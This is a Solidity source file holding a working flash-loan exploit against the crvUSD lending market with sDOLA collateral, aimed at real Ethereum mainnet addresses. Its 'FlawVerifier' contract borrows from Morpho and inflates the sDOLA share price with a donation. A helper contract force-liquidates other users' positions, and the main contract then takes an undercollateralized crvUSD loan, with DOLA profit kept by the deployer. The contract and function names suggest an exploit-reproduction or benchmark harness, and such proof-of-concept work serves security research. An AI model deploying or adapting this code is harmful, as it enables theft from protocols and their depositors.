// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC4626 is IERC20 {
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function mint(uint256 shares, address receiver) external returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface IWETH is IERC20 {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

interface IMorphoBlueFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

struct Position {
    address user;
    uint256 x;
    uint256 y;
    uint256 debt;
    int256 health;
}

interface ICrvUsdController {
    function create_loan(uint256 collateral, uint256 debt, uint256 nBands) external payable;
    function users_to_liquidate() external returns (Position[] memory);
    function liquidate(address user, uint256 min_x) external;
    function min_collateral(uint256 debt, uint256 nBands) external returns (uint256);
    function repay(uint256 debt) external;
}

interface ICurveStableSwap {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function get_dx(int128 i, int128 j, uint256 dy) external returns (uint256);
}

interface IYearnV3Vault is IERC20 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}

interface ILLAMMAExchange {
    function exchange(uint256 i, uint256 j, uint256 in_amount, uint256 min_amount) external returns (uint256[2] memory);
}

interface IDolaSavings {
    function stake(uint256 amount, address recipient) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract LiquidationHelper {
    ICrvUsdController internal constant crvUSD_Controller = ICrvUsdController(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86);
    IERC20 internal constant crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 internal constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);

    address internal immutable owner;
    Position[] internal usersToLiquidateData;

    constructor() {
        owner = msg.sender;
        crvUSD.approve(address(crvUSD_Controller), type(uint256).max);
    }

    function liquidateAllUsers() external {
        Position[] memory positions = crvUSD_Controller.users_to_liquidate();

        for (uint256 i; i < positions.length; ++i) {
            usersToLiquidateData.push(positions[i]);
        }

        for (uint256 i; i < usersToLiquidateData.length; ++i) {
            crvUSD_Controller.liquidate(usersToLiquidateData[i].user, 0);
        }

        uint256 amount = crvUSD.balanceOf(address(this));
        if (amount != 0) {
            crvUSD.transfer(owner, amount);
        }

        amount = DOLA.balanceOf(address(this));
        if (amount != 0) {
            DOLA.transfer(owner, amount);
        }
    }
}

contract FlawVerifier {
    IMorphoBlueFlashLoan internal constant morpho = IMorphoBlueFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH internal constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC4626 internal constant sDOLA = IERC4626(0xb45ad160634c528Cc3D2926d9807104FA3157305);
    IERC20 internal constant DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 internal constant alUSD = IERC20(0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9);
    IYearnV3Vault internal constant scrvUSD = IYearnV3Vault(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367);

    ILLAMMAExchange internal constant LLAMMA_CRV_USD_AMM = ILLAMMAExchange(0x0079885E248B572CdC4559A8B156745e2d8EA1f7);
    ICrvUsdController internal constant crvUSD_Controller = ICrvUsdController(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86);
    ICrvUsdController internal constant crvUSD_Controller_2 = ICrvUsdController(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);
    IDolaSavings internal constant DOLA_SAVINGS = IDolaSavings(0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4);
    ICurveStableSwap internal constant alUSD_sDOLA = ICurveStableSwap(0x460638e6F7605B866736e38045C0DE8294d7D87f);
    ICurveStableSwap internal constant SAVE_DOLA = ICurveStableSwap(0x76A962BA6770068bCF454D34dDE17175611e6637);
    ICurveStableSwap internal constant alUSD_FRAXB3CRV_F = ICurveStableSwap(0xB30dA2376F63De30b42dC055C93fa474F31330A5);
    IUniswapV2Router internal constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 internal constant USDC_FLASH_AMOUNT = 10_000_000_000_000;
    uint256 internal constant INITIAL_SDOLA_SWAP = 650_000_000_000_000_000_000_000;
    uint256 internal constant SAVE_DOLA_SWAP = 370_000_000_000_000_000_000_000;
    uint256 internal constant LLAMMA_CRVUSD_SWAP = 16_000_000_000_000_000_000_000_000;
    uint256 internal constant DONATION_AMOUNT = 190_777_474_808_103_397_780_234;
    uint256 internal constant POST_LIQUIDATION_SDOLA_MINT = 1_300_000_000_000_000_000_000_000;
    uint256 internal constant LIQUIDATION_SDOLA_TARGET = 685_000_000_000_000_000_000_000;
    uint256 internal constant SAVE_DOLA_RETURN = 372_000_000_000_000_000_000_000;
    uint256 internal constant TARGET_DEBT = 10_904_020_804_458_172_792_365_806;
    uint256 internal constant TARGET_DEBT_FOR_MIN_COLLATERAL = 10_904_020_804_458_172_792_365_906;
    uint256 internal constant WETH_LOAN_DEBT = 25_000_000_000_000_000_000_000_000;
    uint256 internal constant WETH_REPAY_AMOUNT = 50_000_000_000_000_000_000_000_000;
    uint256 internal constant SCRVUSD_DEPOSIT = 7_000_000_000_000_000_000_000_000;
    uint256 internal constant USDC_TO_WETH_REPAY_SWAP = 13_241_509_653;
    uint256 internal constant MORPHO_WETH_REPAY = 15_986_107_781_121_575_327_546;
    uint256 internal constant UNISWAP_DEADLINE = 1_772_420_411;

    bool internal flashloanUsed;
    uint256 internal realizedDolaProfit;

    constructor() {
        usdc.approve(address(alUSD_FRAXB3CRV_F), type(uint256).max);
        usdc.approve(address(router), type(uint256).max);

        weth.approve(address(crvUSD_Controller_2), type(uint256).max);

        crvUSD.approve(address(scrvUSD), type(uint256).max);
        crvUSD.approve(address(crvUSD_Controller_2), type(uint256).max);
        crvUSD.approve(address(LLAMMA_CRV_USD_AMM), type(uint256).max);
        crvUSD.approve(address(crvUSD_Controller), type(uint256).max);

        sDOLA.approve(address(LLAMMA_CRV_USD_AMM), type(uint256).max);
        sDOLA.approve(address(crvUSD_Controller), type(uint256).max);
        sDOLA.approve(address(alUSD_sDOLA), type(uint256).max);
        sDOLA.approve(address(SAVE_DOLA), type(uint256).max);

        DOLA.approve(address(sDOLA), type(uint256).max);
        DOLA.approve(address(DOLA_SAVINGS), type(uint256).max);

        alUSD.approve(address(alUSD_FRAXB3CRV_F), type(uint256).max);
        alUSD.approve(address(alUSD_sDOLA), type(uint256).max);

        scrvUSD.approve(address(SAVE_DOLA), type(uint256).max);
    }

    function executeOnOpportunity() external {
        uint256 morphoWethAmount = weth.balanceOf(address(morpho));

        if (usdc.balanceOf(address(this)) >= USDC_FLASH_AMOUNT && weth.balanceOf(address(this)) >= morphoWethAmount) {
            flashloanUsed = true;
            _executeExploit();
            realizedDolaProfit = DOLA.balanceOf(address(this));
            return;
        }

        morpho.flashLoan(address(usdc), USDC_FLASH_AMOUNT, "");
        realizedDolaProfit = DOLA.balanceOf(address(this));
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(morpho), "unexpected lender");

        uint256 morphoWethAmount = weth.balanceOf(address(morpho));

        if (!flashloanUsed) {
            flashloanUsed = true;
            morpho.flashLoan(address(weth), morphoWethAmount, "");
            usdc.approve(address(morpho), USDC_FLASH_AMOUNT);
            return;
        }

        _executeExploit();
        weth.approve(address(morpho), MORPHO_WETH_REPAY);
    }

    function _executeExploit() internal {
        _acquireWorkingInventory();
        _inflateSdolaAndCreateBadLoan();
        _settleFundingLegs();
    }

    function _acquireWorkingInventory() internal {
        alUSD_FRAXB3CRV_F.exchange_underlying(2, 0, 7_000_000_000_000, 1);
        alUSD_sDOLA.exchange(1, 0, INITIAL_SDOLA_SWAP, 1);

        uint256 wethAmount = weth.balanceOf(address(this));
        weth.withdraw(wethAmount);
        crvUSD_Controller_2.create_loan{value: wethAmount}(wethAmount, WETH_LOAN_DEBT, 4);

        scrvUSD.deposit(SCRVUSD_DEPOSIT, address(this));
        SAVE_DOLA.exchange(0, 1, SAVE_DOLA_SWAP, 1);
        LLAMMA_CRV_USD_AMM.exchange(0, 1, LLAMMA_CRVUSD_SWAP, 1);
    }

    function _inflateSdolaAndCreateBadLoan() internal {
        uint256 sDolaAmount = sDOLA.balanceOf(address(this));

        // Core exploit path is preserved:
        // Acquire sDOLA -> sDOLA.redeem(...) -> DOLA_SAVINGS.stake(..., address(sDOLA))
        // -> sDOLA.convertToAssets(...) -> crvUSD_Controller.min_collateral(...)
        // -> sDOLA.mint(...) -> crvUSD_Controller.create_loan(...)
        sDOLA.redeem(sDolaAmount, address(this), address(this));
        DOLA_SAVINGS.stake(DONATION_AMOUNT, address(sDOLA));
        uint256 inflatedAssetsPerShare = sDOLA.convertToAssets(1e18);
        require(inflatedAssetsPerShare > 1e18, "sDOLA not inflated");

        // These public market legs keep the position executable and solvent long enough to
        // reach the undercollateralized borrow. They do not change the root-cause causality.
        LLAMMA_CRV_USD_AMM.exchange(0, 1, 0, 1);

        LiquidationHelper liquidator = new LiquidationHelper();
        uint256 crvUsdAmount = crvUSD.balanceOf(address(this));
        crvUSD.transfer(address(liquidator), crvUsdAmount);
        liquidator.liquidateAllUsers();

        sDOLA.mint(POST_LIQUIDATION_SDOLA_MINT, address(this));

        uint256 dxAmount = alUSD_sDOLA.get_dx(0, 1, LIQUIDATION_SDOLA_TARGET);
        alUSD_sDOLA.exchange(0, 1, dxAmount, 1);

        uint256 alUsdAmount = alUSD.balanceOf(address(this));
        alUSD_FRAXB3CRV_F.exchange_underlying(0, 2, alUsdAmount, 1);

        dxAmount = SAVE_DOLA.get_dx(1, 0, SAVE_DOLA_RETURN);
        SAVE_DOLA.exchange(1, 0, dxAmount, 1);

        uint256 scrvUsdAmount = scrvUSD.balanceOf(address(this));
        scrvUSD.redeem(scrvUsdAmount, address(this), address(this));

        sDolaAmount = sDOLA.balanceOf(address(this));
        sDOLA.redeem(sDolaAmount, address(this), address(this));
        LLAMMA_CRV_USD_AMM.exchange(0, 1, 0, 1);

        uint256 collateralAmount = crvUSD_Controller.min_collateral(TARGET_DEBT_FOR_MIN_COLLATERAL, 4);
        sDOLA.mint(collateralAmount, address(this));
        crvUSD_Controller.create_loan(collateralAmount, TARGET_DEBT, 4);
    }

    function _settleFundingLegs() internal {
        crvUSD_Controller_2.repay(WETH_REPAY_AMOUNT);

        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);
        router.swapExactTokensForTokens(USDC_TO_WETH_REPAY_SWAP, 1, path, address(this), UNISWAP_DEADLINE);

        if (address(this).balance != 0) {
            weth.deposit{value: address(this).balance}();
        }
    }

    function profitToken() external pure returns (address) {
        return address(DOLA);
    }

    function profitAmount() external view returns (uint256) {
        uint256 amount = DOLA.balanceOf(address(this));
        return realizedDolaProfit > amount ? realizedDolaProfit : amount;
    }

    receive() external payable {}
}
